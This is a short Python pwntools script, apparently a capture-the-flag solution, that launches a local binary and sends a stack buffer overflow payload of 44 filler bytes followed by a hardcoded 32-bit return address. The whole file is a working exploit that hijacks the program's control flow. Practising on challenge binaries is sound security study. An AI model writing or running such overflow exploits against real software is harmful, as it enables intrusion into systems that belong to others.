from pwn import *
context.log_level = 'debug'

p="./elf"


context.binary=p
io=process(p)

payload="a"*44+p32(0x08048659)
io.recvuntil("> ")
io.sendline(payload)

print(io.recvline())
